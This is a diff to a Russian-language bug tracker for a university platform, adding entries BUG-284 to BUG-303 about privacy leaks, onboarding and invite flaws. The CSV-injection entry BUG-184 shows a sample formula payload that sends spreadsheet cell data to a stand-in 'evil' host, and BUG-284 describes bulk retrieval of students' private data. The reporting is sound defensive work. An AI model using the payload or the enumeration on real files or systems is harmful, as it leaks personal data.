@@ -1263,7 +1263,7 @@
 
 #### BUG-184 · 🟠 🔒 CSV-выгрузки исполняют формулы из имён, названий групп, факультетов и компаний
 - **Роль:** кто открывает файл (админ вуза, декан, карьерный центр, PLATFORM_*); атакующий — студент или работодатель · **Статус:** подтверждён
-- **Где:** `apps/api/src/common/export/spreadsheet.builder.ts:94-98` (`buildCsv` только берёт в кавычки); источники — `apps/api/src/modules/users/users.service.ts:2607-2608`, `apps/api/src/modules/career/career-report.export.ts:284-286`, `apps/api/src/modules/analytics/analytics-report.export.ts:166-167`
+- **Где:** `apps/api/src/common/export/spreadsheet.builder.ts:94-98` (`buildCsv` только берёт в кавычки); источники — `apps/api/src/modules/users/users.service.ts:2607-2608`, `apps/api/src/modules/career/career-report.export.ts:284-286`, `apps/api/src/modules/analytics/analytics-report.export.ts:166-167`, выгрузка пользователей `apps/api/src/modules/users/users.service.ts:592` (`GET /users/export?format=csv`)
 - **Сценарий:** студент ставит имя `=HYPERLINK("https://evil/?x="&A2;"Открыть")` — админ открывает CSV в Excel/LibreOffice, ячейка исполняется: фишинг, утечка соседних ячеек, DDE. XLSX безопасен (строки типом `s`).
 - **Ожидается:** значения с ведущими `= + - @ \t \r` экранировать в `buildCsv` (OWASP CSV Injection).
 
@@ -1602,6 +1602,78 @@
 
 #### BUG-283 · 🟢 Список зрителей сторис: «Далее» вместо «Показать ещё»
 - **Где:** `apps/web/src/widgets/stories-rail/ui/story-viewers-sheet.tsx:58-67` · **Статус:** новый
+
+### Пользователи, инвайты, структура вуза, онбординг
+
+#### BUG-284 · 🟡 🔒 `PATCH /users/:id/academic` отдаёт декану и админу вуза полную карточку студента в обход приватности
+- **Роль:** DEAN, UNIVERSITY_ADMIN → STUDENT, STAROSTA · **Статус:** подтверждён
+- **Где:** `apps/api/src/modules/users/users.service.ts:1897-1903` (`select: PROFILE_SELECT`), `users.controller.ts:338-355`; сравнить с `getProfileForViewer` `:1115-1162`
+- **Сценарий:** `PATCH` с пустым телом `{}` возвращает `phone` при `showPhone=false`, `address`, `studentCardNumber`, `username`, `twoFactorEnabled` — можно перебрать весь факультет.
+- **Ожидается:** §3.7 — ответ как в `getProfileForViewer` или только учебные поля.
+
+#### BUG-285 · 🟡 🔒 «Статус» в профиле — это семейное положение, и он виден в «визитке» закрытого профиля, справочнике и у работодателя
+- **Где:** `apps/web/src/widgets/user-profile/ui/profile-edit-form.tsx:303-308`, `widgets/account-settings/ui/account-settings-panels.tsx:352-360` (`MARITAL_STATUS_DICT` для `headline`), `widgets/user-profile/ui/completion.ts:35`, `apps/api/src/modules/users/users.service.ts:665,1397`, `apps/web/src/views/employer/ui/employer-candidates-view.tsx:169` · **Статус:** новый
+- **Ожидается:** §3.7 — закрытый профиль скрывает личные сведения; семейное положение не в публичном поле.
+
+#### BUG-286 · 🟡 Необязательные шаги мастера настройки вуза нельзя пропустить — кнопки «Пропустить» нет
+- **Где:** `apps/web/src/views/onboarding/ui/step-body.tsx:51-61,122-143`, `entities/onboarding/api/onboarding-api.ts:72` (`skipOnboardingStep` не вызывается), `apps/api/src/modules/onboarding/onboarding.service.ts:96-121` · **Статус:** новый
+- **Ожидается:** §31 — `specialties`, `rooms`, `subjects` пропускаются; иначе запуск требует фиктивных записей.
+
+#### BUG-287 · 🟡 Мастер обещает «до запуска вуз закрыт», но вуз в статусе PENDING полностью рабочий
+- **Где:** `apps/api/src/modules/universities/university-access.service.ts:56-70` (запрещает только BLOCKED), `auth.service.ts:133,172`, `strategies/jwt.strategy.ts:66`, тексты `apps/web/messages/*.json` `Setup.bannerText`, `Setup.launchReady` · **Статус:** новый
+- **Ожидается:** §31 — закрыть доступ при PENDING или поправить тексты.
+
+#### BUG-288 · 🟡 Регистрация по инвайту с занятым логином отвечает общим `CONFLICT` — поле не подсветить
+- **Где:** `apps/api/src/modules/users/users.service.ts:2497-2508`, `apps/web/src/features/auth-invite/ui/register-form.tsx:184` · **Статус:** новый
+- **Ожидается:** §8.2 — `USERNAME_TAKEN` отдельно; FRONTEND_RULES §7 — ошибка у поля.
+
+#### BUG-289 · 🟡 Массовый импорт инвайтов: предпросмотр «Готово», а подтверждение отклоняет весь файл
+- **Где:** `apps/api/src/modules/invites/invites.service.ts:340` (свой regex), `packages/shared-schemas/src/invites.ts` (`InviteEmailSchema` в `BulkInviteCommitRowSchema`), `apps/web/src/features/create-invite/ui/bulk-invite.tsx:80-95` · **Статус:** новый
+- **Сценарий:** `ivan..petrov@uni.kz`, `иван@uni.kz` проходят предпросмотр, схема валит всю пачку — ни одного из 500 инвайтов.
+
+#### BUG-290 · 🟡 Учебный статус принимается свободным текстом — «Отчислена» не считается уходом (корень BUG-002)
+- **Где:** `apps/web/src/features/edit-academic-record/ui/academic-record-modal.tsx:40` (свой ввод в `DictSingleSelect`), `packages/shared-schemas/src/users.ts` (`academicStatus: shortText`), `apps/api/src/modules/users/academic-status.ts:6` · **Статус:** новый
+- **Ожидается:** закрытый справочник статусов (PERSONAL_DATA §4, §3.7).
+
+#### BUG-291 · 🟢 Дату рождения можно стереть — проверка основания согласия молча отключается
+- **Где:** `packages/shared-schemas/src/users.ts` (`birthDate … .nullable()`), `apps/api/src/modules/users/consent.ts:56-66` · **Статус:** новый
+
+#### BUG-292 · 🟢 Плитка «Студенты» на дашборде вуза не считает старост
+- **Где:** `apps/api/src/modules/universities/universities.service.ts:268` (`role: STUDENT`; аналитика платформы считает `[STUDENT, STAROSTA]`) · **Статус:** новый
+
+#### BUG-293 · 🟢 Поиск в таблицах пользователей и вузов не даёт ввести пробел (корень BUG-052)
+- **Где:** `apps/web/src/widgets/users-table/ui/users-table.tsx:200`, `apps/web/src/views/platform-admin/ui/universities-admin-view.tsx:142` · **Статус:** новый
+
+#### BUG-294 · 🟢 Страница регистрации показывает одну ошибку для отозванного, использованного, истёкшего инвайта и лимита
+- **Где:** `apps/web/src/features/auth-invite/ui/register-form.tsx:189-205` · **Статус:** новый
+- **Ожидается:** §7.3 п. 3 — текст по конкретному коду (`Errors.INVITE_*`).
+
+#### BUG-295 · 🟢 Мастер, подтверждение заявки, массовый импорт и формы регистрации показывают сырые тексты сервера и Zod
+- **Где:** `apps/web/src/views/onboarding/ui/step-body.tsx:134,155,186`, `views/demo/ui/demo-verify-view.tsx:42`, `features/create-invite/ui/bulk-invite.tsx:238,246`, `features/auth-invite/ui/register-form.tsx`, `views/demo/ui/demo-request-view.tsx` (тот же корень, что BUG-210/211) · **Статус:** новый
+
+#### BUG-296 · 🟢 Срок действия в письмах-приглашениях, по заявке вуза и сбросе пароля — в UTC без пояса
+- **Где:** `apps/api/src/modules/invites/invites.service.ts:235-238`, `apps/api/src/modules/onboarding/demo-requests.service.ts:39,192,288,524`, `apps/api/src/modules/auth/password-reset.service.ts:78` · **Статус:** новый
+
+#### BUG-297 · 🟢 Факультет не удалить из-за декана или «надгробия», а экран пишет «есть группы»
+- **Где:** `apps/api/src/modules/faculties/faculties.service.ts:139-146`, `prisma/schema/01-users.prisma:234` (`Restrict`), `apps/api/src/modules/users/users.service.ts:2056` (`softDeleteSelf` не обнуляет `facultyId`), `apps/web/src/views/university-admin/ui/faculties-view.tsx:40` · **Статус:** новый
+
+#### BUG-298 · 🟢 Смена и снятие старосты — одним выбором в селекте, без подтверждения (как BUG-036)
+- **Где:** `apps/web/src/features/assign-starosta/ui/assign-starosta.tsx:59,76` · **Статус:** новый
+
+#### BUG-299 · 🟢 Год группы нельзя очистить, а ошибка в годе не показывается (корень BUG-047)
+- **Где:** `packages/shared-schemas/src/groups.ts:18`, `apps/web/src/views/university-admin/ui/edit-group-modal.tsx:57-66`, `create-group-modal.tsx` · **Статус:** новый
+
+#### BUG-300 · 🟢 В фильтре ролей у платформы нет модераторов платформы, админов платформы и работодателей
+- **Где:** `apps/web/src/widgets/users-table/ui/users-table.tsx:75-84` (`FILTER_ROLES`) · **Статус:** новый
+
+#### BUG-301 · 🟢 Перевести студента в другую группу нечем, хотя удаление группы этого ждёт
+- **Где:** `apps/api/src/modules/groups/groups.service.ts:44-47,262-270`; в API нет пути смены `groupId`/`facultyId` · **Статус:** новый
+
+#### BUG-302 · 🟢 После одобрения заявки вуза ссылку-приглашение нельзя получить или выслать повторно
+- **Где:** `apps/api/src/modules/onboarding/demo-requests.service.ts:445-447,517-527,538`, `apps/web/src/views/platform-admin/ui/demo-request-modal.tsx` · **Статус:** новый
+
+#### BUG-303 · 🟢 У старосты, пришедшего по инвайту, `starostaSince` пустой
+- **Где:** `apps/api/src/modules/users/users.service.ts:1802-1807,2480-2486` · **Статус:** новый
 
 <!-- P3-END -->
 
